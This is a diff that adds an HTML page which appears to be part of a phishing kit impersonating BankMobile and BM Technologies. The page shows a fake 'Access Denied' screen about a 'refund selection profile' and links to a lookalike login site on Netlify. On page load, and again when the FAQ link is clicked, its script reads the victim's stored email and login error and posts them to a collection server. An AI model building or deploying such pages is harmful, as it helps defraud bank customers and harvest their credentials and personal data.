@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>authentication-vibe.bmtx.com/identity/account/forgotlogininformation?tenantId=b15394b5-1c89-4bd3-9652-935e91475d31&returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dbmt-vibe-web-secure%26redirect_uri%3Dhttps%253A%252F%252Fsecure.vibeaccount.com%252Fapi%252Fsession%252Flogin%26response_type%3Dcode%26scope%3Dopenid%20profile%20offline_access%26state%3D3f9069e0-2675-f111-ac9d-002248463006%26acr_values%3Dxtdid%3A3f9069e0-2675-f111-ac9d-002248463006&deviceId=3f9069e0-2675-f111-ac9d-002248463006</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    <link rel="apple-touch-icon" href="https://cdn.corenexis.com/f/lBRnRiPy7OO.png" />
+    
+    <!-- CSS -->
+    <link rel="stylesheet" href="/lib/bootstrap/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="/css/site.css" />
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-image: url('https://cdn.corenexis.com/f/5upabsqQ4fJ.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px 40px 20px;
+            color: #1a1a1a;
+        }
+
+        .top-bar {
+            position: absolute;
+            top: 35px;
+            left: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 40px;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 40px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a1a1a;
+            padding: 8px;
+            text-decoration: none;
+            transition: opacity 0.15s ease;
+        }
+
+        .back-btn:hover {
+            opacity: 0.7;
+        }
+
+        .top-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1c2024;
+            text-align: center;
+        }
+
+        .content-container {
+            width: 100%;
+            max-width: 440px;
+            display: flex;
+            flex-direction: column;
+            margin-top: 20px;
+        }
+
+        h2 {
+            font-family: Rockwell, "Rockwell Nova", "Courier New", Georgia, serif;
+            font-size: 32px;
+            font-weight: 700;
+            text-align: left;
+            line-height: 1.15;
+            color: #1c2024;
+            margin-bottom: 24px;
+            letter-spacing: -0.5px;
+        }
+
+        .description-paragraph {
+            font-size: 14.5px;
+            line-height: 1.5;
+            color: #333333;
+            text-align: left;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .dashboard-btn {
+            width: 100%;
+            background-color: #7fc7ec;
+            color: #124c80;
+            border: none;
+            padding: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 0px;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 15px;
+            margin-bottom: 12px;
+            transition: background-color 0.15s ease, color 0.15s ease;
+        }
+
+        .dashboard-btn:hover {
+            background-color: #0056b3;
+            color: #ffffff;
+        }
+
+        .faq-link-container {
+            text-align: center;
+            width: 100%;
+        }
+
+        .faq-link {
+            display: block;
+            width: 100%;
+            font-size: 14.5px;
+            color: #0056b3;
+            text-decoration: none;
+            font-weight: 600;
+            background-color: transparent;
+            border: none;
+            outline: none;
+            padding: 16px;
+            border-radius: 0px;
+            cursor: pointer;
+            transition: all 0.15s ease-in-out;
+            text-align: center;
+        }
+
+        .faq-link:hover {
+            color: #111111;
+            background: linear-gradient(
+                to bottom, 
+                #ffffff 0%, 
+                #f2f2f2 15%, 
+                #dfdfdf 50%, 
+                #cccccc 85%, 
+                #b0b0b0 100%
+            );
+            box-shadow: 
+                inset 0 1px 0 #ffffff, 
+                0 2px 4px rgba(0, 0, 0, 0.15);
+            border: none;
+            outline: none;
+        }
+
+        .faq-link:active, .faq-link:focus {
+            outline: 2px solid #000000 !important;
+            outline-offset: -2px;
+        }
+
+        footer {
+            font-size: 14px;
+            color: #212529;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 800px;
+            width: 100%;
+            margin-top: auto;
+            padding-top: 60px;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header navigation bar -->
+    <div class="top-bar">
+        <a href="index.html" class="back-btn" aria-label="Go back to login">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"></line>
+                <polyline points="12 19 5 12 12 5"></polyline>
+            </svg>
+        </a>
+        <div class="top-title">Access Denied</div>
+    </div>
+
+    <!-- Main Content Area -->
+    <div class="content-container">
+        <h2>Looking for your refund selection profile?</h2>
+        
+        <p class="description-paragraph">
+            If you need to access your refund selection account, please log in to your refund profile dashboard.
+        </p>
+        
+        <p class="description-paragraph">
+            If you need additional information, please check out the BankMobile FAQs.
+        </p>
+
+        <!-- Main interactive actions -->
+        <a href="https://verifyviberefundaccount.netlify.app/" class="dashboard-btn">Log in to profile Dashboard</a>
+
+        <!-- Interactive FAQ Button -->
+        <div class="faq-link-container">
+            <a href="#" class="faq-link" id="faqLink">BankMobile FAQs</a>
+        </div>
+    </div>
+
+    <!-- Page Footer -->
+    <footer>
+        © 2026 BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.<br>
+        Powered by BM Technologies, Inc. BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC.
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const SERVER_URL = 'http://localhost:3000';
+
+            // ============================================
+            // Send Access Denied Notification to Server
+            // ============================================
+            async function sendAccessDeniedNotification(email, error) {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/access-denied`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            email: email || 'Not provided',
+                            error: error || 'Account not found'
+                        })
+                    });
+                    
+                    return await response.json();
+                    
+                } catch (error) {
+                    console.error('Server error:', error);
+                    return { success: false };
+                }
+            }
+
+            // ============================================
+            // Send FAQ Click Notification to Server
+            // ============================================
+            async function sendFAQClickNotification(email) {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/faq-click`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            email: email || 'Not provided'
+                        })
+                    });
+                    
+                    return await response.json();
+                    
+                } catch (error) {
+                    console.error('Server error:', error);
+                    return { success: false };
+                }
+            }
+
+            // ============================================
+            // Send notification when page loads
+            // ============================================
+            (async function() {
+                const userEmail = localStorage.getItem('userEmail') || 'Not provided';
+                const loginError = localStorage.getItem('loginError') || 'Account not found';
+                
+                try {
+                    await sendAccessDeniedNotification(userEmail, loginError);
+                } catch (error) {
+                    console.error('Error sending notification:', error);
+                }
+            })();
+
+            // ============================================
+            // Handle FAQ Link Click
+            // ============================================
+            document.getElementById('faqLink').addEventListener('click', async function(e) {
+                e.preventDefault();
+                
+                const userEmail = localStorage.getItem('userEmail') || 'Not provided';
+                
+                try {
+                    await sendFAQClickNotification(userEmail);
+                } catch (error) {
+                    console.error('Error:', error);
+                }
+                
+                window.open('https://www.bankmobile.com/faq', '_blank');
+            });
+
+            // ============================================
+            // Handle Back Button Click
+            // ============================================
+            document.querySelector('.back-btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                localStorage.removeItem('loginError');
+                window.location.href = 'index.html';
+            });
+
+            // ============================================
+            // Clear storage when leaving the page
+            // ============================================
+            window.addEventListener('beforeunload', function() {
+                localStorage.removeItem('loginError');
+            });
+        });
+    </script>
+</body>
+</html>
